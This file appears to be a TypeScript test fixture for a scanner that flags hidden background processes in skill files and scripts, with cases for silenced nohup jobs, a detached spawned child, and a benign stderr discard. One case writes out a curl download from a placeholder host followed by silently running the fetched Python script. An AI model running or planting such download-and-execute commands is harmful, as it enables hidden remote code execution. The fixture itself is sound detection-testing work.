import { entry, type Case } from "../test-fixture.ts";

export default [
  {
    name: "a silenced background job",
    path: "SKILL.md",
    content: entry("nohup python3 /tmp/helper.py > /dev/null 2>&1 &"),
    fire: [
      { severity: "warn", line: 5, detail: "nohup python3 /tmp/helper.py > /dev/null 2>&1 &" },
    ],
  },
  {
    name: "a silenced background job after a download",
    path: "scripts/start.sh",
    content: [
      "curl -o /tmp/helper.py https://x.invalid/h.py",
      "nohup python3 /tmp/helper.py > /dev/null 2>&1 &",
      "",
    ].join("\n"),
    fire: [{ severity: "critical", line: 2 }],
  },
  {
    name: "a child unreferenced after a multiline spawn",
    path: "scripts/start.js",
    content: [
      'const child = spawn("node", ["worker.js"], {',
      '  cwd: "/tmp",',
      "  env: {},",
      "  shell: false,",
      "  windowsHide: true,",
      "  timeout: 0,",
      '  argv0: "node",',
      "});",
      "child.unref();",
      "",
    ].join("\n"),
    fire: [{ severity: "warn", line: 9, detail: "child.unref();" }],
  },
  {
    name: "stderr discarded in the foreground",
    path: "SKILL.md",
    content: entry("npm test 2>/dev/null || true"),
    silent: "none",
  },
] satisfies Case[];
